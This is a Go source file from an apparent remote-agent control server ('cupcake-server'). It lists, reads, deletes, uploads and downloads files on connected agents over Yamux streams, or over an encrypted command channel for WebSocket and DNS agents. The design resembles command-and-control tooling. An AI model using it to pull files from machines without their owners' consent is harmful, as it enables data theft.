package services

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"time"

	"github.com/hashicorp/yamux"

	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/utils"
)

// ErrAgentOffline is returned when the agent has no live session (Yamux or command channel).
var ErrAgentOffline = errors.New("agent offline")

// ErrYamuxRequired is returned when a product path requires a live TCP Yamux session
// (large file put/get) and the agent is missing or closed.
var ErrYamuxRequired = errors.New("TCP Yamux session required for file transfer")

// Helper: GetAgentSession retrieves the Yamux session for a TCP agent
func GetAgentSession(agentID string) (*yamux.Session, bool) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, false
	}
	client := val.(*globals.Client)
	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
		return nil, false
	}
	return client.YamuxSession, true
}

// requireAgentYamux returns a live Yamux session or a clear product error (no control-plane fallback).
func requireAgentYamux(agentID string) (*yamux.Session, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, ErrAgentOffline
	}
	client := val.(*globals.Client)
	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
		return nil, ErrYamuxRequired
	}
	return client.YamuxSession, nil
}

type FsRequest struct {
	Action string   `json:"action"` // "list", "read", "rm"
	Path   string   `json:"path"`
	Paths  []string `json:"paths,omitempty"`
}

type FsResponse struct {
	Status      string      `json:"status"`
	Error       string      `json:"error,omitempty"`
	Files       interface{} `json:"files,omitempty"`
	CurrentPath string      `json:"current_path,omitempty"`
	Content     string      `json:"content,omitempty"`
}

func GetFileList(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "list", Path: path})
}

func ReadFile(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "read", Path: path})
}

func DownloadFile(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "download", Path: path})
}

func DeleteFiles(agentID string, paths []string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "rm", Paths: paths})
}

func callFsAgent(agentID string, req FsRequest) (*FsResponse, error) {
	session, exists := GetAgentSession(agentID)
	if !exists {
		// ⚡️ FALLBACK: Use JSON-based command channel if Yamux is not supported/online (e.g. WebSocket agents)
		return callFsAgentFallback(agentID, req)
	}

	stream, err := session.Open()
	if err != nil {
		// Fallback on stream failure too
		return callFsAgentFallback(agentID, req)
	}
	defer stream.Close()

	// 1. Send Header (YamuxStreamFS)
	if _, err := stream.Write([]byte{utils.YamuxStreamFS}); err != nil {
		return nil, err
	}

	// ⚡️ FIX: Use Encoder directly (No Binary Length Prefix!)
	if err := json.NewEncoder(stream).Encode(req); err != nil {
		return nil, fmt.Errorf("failed to send request: %v", err)
	}

	// 2. Read Response - ROBUST MODE (Read all until EOF then unmarshal)
	// 与 websocket.go 单帧读超时 120s 对齐 — 大文件 / 慢链路下 15s 根本来不及传完。
	// list/read 都走 Yamux FS 0x03 全量读整 JSON(含 base64 整文件),必须放宽。
	stream.SetReadDeadline(time.Now().Add(120 * time.Second))

	data, err := io.ReadAll(stream)
	if err != nil {
		return nil, fmt.Errorf("read stream failed: %v", err)
	}

	var resp FsResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("unmarshal failed: %v | Raw: %s", err, string(data))
	}

	if resp.Status == "error" {
		return nil, fmt.Errorf("agent error: %s", resp.Error)
	}

	return &resp, nil
}

func callFsAgentFallback(agentID string, req FsRequest) (*FsResponse, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, ErrAgentOffline
	}
	client := val.(*globals.Client)

	// Map FsRequest to Protocol Command
	cmdType := ""
	switch req.Action {
	case "list":
		cmdType = "file_ls"
	case "read":
		cmdType = "file_download" // Agent uses file_download to return bytes
	case "download":
		cmdType = "file_download" // Agent uses file_download for binary too
	case "rm":
		cmdType = "file_delete" // Agent uses file_delete
	default:
		return nil, fmt.Errorf("unsupported fallback action: %s", req.Action)
	}

	reqID := fmt.Sprintf("FS-%d", globals.GetNextReqID())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType: cmdType,
			Path:        req.Path,
			ReqID:       reqID,
		},
	}

	// If it's a multi-file delete, we pass them in Content
	if req.Action == "rm" && len(req.Paths) > 0 {
		pathsJson, _ := json.Marshal(req.Paths)
		msg.Payload = globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: string(pathsJson),
			ReqID:          reqID,
		}
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return nil, err
	}

	select {
	case res := <-resChan:
		pMap := res.(map[string]interface{})

		var fsResp FsResponse
		fsResp.Status = "ok"

		// Parse based on command type
		if cmdType == "file_ls" {
			if stdout, ok := pMap["stdout"].(string); ok {
				var files interface{}
				if err := json.Unmarshal([]byte(stdout), &files); err == nil {
					fsResp.Files = files
				}
			}
		} else if cmdType == "file_download" {
			if stdout, ok := pMap["stdout"].(string); ok {
				fsResp.Content = stdout // Base64
			}
		}

		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return nil, fmt.Errorf("%s", stderr)
		}

		return &fsResp, nil
	case <-time.After(120 * time.Second):
		return nil, fmt.Errorf("agent response timeout")
	}
}

// HasYamux reports whether the agent has a live Yamux session (FILE 0x0E capable).
func HasYamux(agentID string) bool {
	_, ok := GetAgentSession(agentID)
	return ok
}

// UploadChunk sends one base64 chunk over the control-plane command channel.
// Fallback path only: agents without a Yamux session (WebSocket / DNS) cannot
// use the FILE (0x0E) binary stream, so the panel chunks the file here.
func UploadChunk(agentID, path, dataBase64 string, isAppend bool) error {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return ErrAgentOffline
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("FSUC-%d", globals.GetNextReqID())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	cmdContent, _ := json.Marshal(map[string]interface{}{
		"is_append": isAppend,
	})

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "file_upload_chunk",
			CommandContent: string(cmdContent),
			Path:           path,
			Data:           dataBase64,
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return fmt.Errorf("send encrypted command: %w", err)
	}

	// 与 websocket.go 单帧读超时对齐:慢链路 / 高负载下 512KiB 片可能超过 30s。
	select {
	case res := <-resChan:
		pMap, ok := res.(map[string]interface{})
		if !ok {
			return fmt.Errorf("invalid agent response type")
		}
		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return fmt.Errorf("%s", stderr)
		}
		return nil
	case <-time.After(120 * time.Second):
		return fmt.Errorf("agent chunk response timeout")
	}
}

// DownloadChunk requests one base64 chunk (offset+size) over the control-plane
// command channel. Returns the decoded chunk payload, isEOF flag and total size.
// Fallback path only: agents without a Yamux session (WebSocket / DNS).
func DownloadChunk(agentID, path string, offset uint64, size int) (data []byte, isEOF bool, total uint64, err error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, false, 0, ErrAgentOffline
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("FSDC-%d", globals.GetNextReqID())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	cmdContent, _ := json.Marshal(map[string]interface{}{
		"offset": offset,
		"size":   size,
	})

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "file_download_chunk",
			CommandContent: string(cmdContent),
			Path:           path,
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return nil, false, 0, fmt.Errorf("send encrypted command: %w", err)
	}

	select {
	case res := <-resChan:
		pMap, ok := res.(map[string]interface{})
		if !ok {
			return nil, false, 0, fmt.Errorf("invalid agent response type")
		}
		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return nil, false, 0, fmt.Errorf("%s", stderr)
		}
		stdout, _ := pMap["stdout"].(string)
		var chunkResp struct {
			Data  string `json:"data"`
			IsEOF bool   `json:"is_eof"`
			Total uint64 `json:"total,omitempty"`
		}
		if err := json.Unmarshal([]byte(stdout), &chunkResp); err != nil {
			return nil, false, 0, fmt.Errorf("invalid chunk response: %v", err)
		}
		raw, err := base64.StdEncoding.DecodeString(chunkResp.Data)
		if err != nil {
			return nil, false, 0, fmt.Errorf("bad base64 in chunk response: %v", err)
		}
		return raw, chunkResp.IsEOF, chunkResp.Total, nil
	case <-time.After(120 * time.Second):
		return nil, false, 0, fmt.Errorf("agent chunk response timeout")
	}
}

// openFileStream opens a Yamux stream and writes the FILE (0x0E) type byte.
func openFileStream(session *yamux.Session) (io.ReadWriteCloser, error) {
	stream, err := session.Open()
	if err != nil {
		return nil, fmt.Errorf("yamux open: %w", err)
	}
	if _, err := stream.Write([]byte{utils.YamuxStreamFILE}); err != nil {
		_ = stream.Close()
		return nil, fmt.Errorf("write FILE stream type: %w", err)
	}
	// Large transfers: clear deadlines; HTTP admin server already has ReadTimeout 0.
	_ = stream.SetReadDeadline(time.Time{})
	_ = stream.SetWriteDeadline(time.Time{})
	return stream, nil
}

// UploadViaYamux streams raw body from r to agent remotePath over Yamux FILE (0x0E) put.
// No control-plane / base64 / file_upload_chunk fallback.
// Returns bytes the agent reported written.
func UploadViaYamux(agentID, remotePath string, r io.Reader) (written int64, err error) {
	if remotePath == "" {
		return 0, fmt.Errorf("empty remote path")
	}
	if r == nil {
		return 0, fmt.Errorf("nil reader")
	}
	session, err := requireAgentYamux(agentID)
	if err != nil {
		return 0, err
	}
	stream, err := openFileStream(session)
	if err != nil {
		return 0, err
	}
	defer stream.Close()

	if err := utils.WriteFileRequestHeader(stream, utils.FileOpPut, remotePath); err != nil {
		return 0, fmt.Errorf("write put header: %w", err)
	}

	sent, err := utils.StreamFilePutBody(stream, r, utils.DefaultFileChunkSize)
	if err != nil {
		return sent, fmt.Errorf("put body: %w", err)
	}

	// Response may take a while after large write (agent flush / rename).
	if sc, ok := stream.(interface{ SetReadDeadline(time.Time) error }); ok {
		_ = sc.SetReadDeadline(time.Now().Add(120 * time.Second))
	}
	resp, err := utils.ReadFilePutResponse(stream)
	if err != nil {
		return sent, fmt.Errorf("put response: %w", err)
	}
	if resp.Status != utils.FileStatusOK {
		msg := resp.Message
		if msg == "" {
			msg = fmt.Sprintf("agent put status=%d", resp.Status)
		}
		return int64(resp.Written), fmt.Errorf("agent put failed: %s", msg)
	}
	return int64(resp.Written), nil
}

// fileGetBody closes the underlying Yamux stream when the body is done or closed.
type fileGetBody struct {
	r      io.Reader
	stream io.Closer
	closed bool
}

func (b *fileGetBody) Read(p []byte) (int, error) {
	return b.r.Read(p)
}

func (b *fileGetBody) Close() error {
	if b.closed {
		return nil
	}
	b.closed = true
	return b.stream.Close()
}

// OpenDownloadViaYamux starts a Yamux FILE get and returns a body reader limited to
// the agent-reported size. Caller must Close the body. Content-Length can use size
// before streaming. No control-plane / file_download_chunk fallback.
func OpenDownloadViaYamux(agentID, remotePath string) (body io.ReadCloser, size uint64, err error) {
	if remotePath == "" {
		return nil, 0, fmt.Errorf("empty remote path")
	}
	session, err := requireAgentYamux(agentID)
	if err != nil {
		return nil, 0, err
	}
	stream, err := openFileStream(session)
	if err != nil {
		return nil, 0, err
	}

	if err := utils.WriteFileRequestHeader(stream, utils.FileOpGet, remotePath); err != nil {
		_ = stream.Close()
		return nil, 0, fmt.Errorf("write get header: %w", err)
	}

	if sc, ok := stream.(interface{ SetReadDeadline(time.Time) error }); ok {
		_ = sc.SetReadDeadline(time.Now().Add(60 * time.Second))
	}
	hdr, err := utils.ReadFileGetHeader(stream)
	if err != nil {
		_ = stream.Close()
		return nil, 0, fmt.Errorf("get header: %w", err)
	}
	if hdr.Status != utils.FileStatusOK {
		_ = stream.Close()
		msg := hdr.Message
		if msg == "" {
			msg = fmt.Sprintf("agent get status=%d", hdr.Status)
		}
		return nil, 0, fmt.Errorf("agent get failed: %s", msg)
	}

	// Large body: clear deadline.
	if sc, ok := stream.(interface{ SetReadDeadline(time.Time) error }); ok {
		_ = sc.SetReadDeadline(time.Time{})
	}
	return &fileGetBody{
		r:      io.LimitReader(stream, int64(hdr.Size)),
		stream: stream,
	}, hdr.Size, nil
}

// DownloadViaYamux streams agent remotePath to w over Yamux FILE (0x0E) get.
// On success returns the file size from the agent header.
// No control-plane / file_download_chunk fallback.
func DownloadViaYamux(agentID, remotePath string, w io.Writer) (size uint64, err error) {
	if w == nil {
		return 0, fmt.Errorf("nil writer")
	}
	body, size, err := OpenDownloadViaYamux(agentID, remotePath)
	if err != nil {
		return 0, err
	}
	defer body.Close()

	written, err := io.Copy(w, body)
	if err != nil {
		return size, fmt.Errorf("get body: %w", err)
	}
	if uint64(written) != size {
		return size, fmt.Errorf("short body: got %d want %d", written, size)
	}
	return size, nil
}
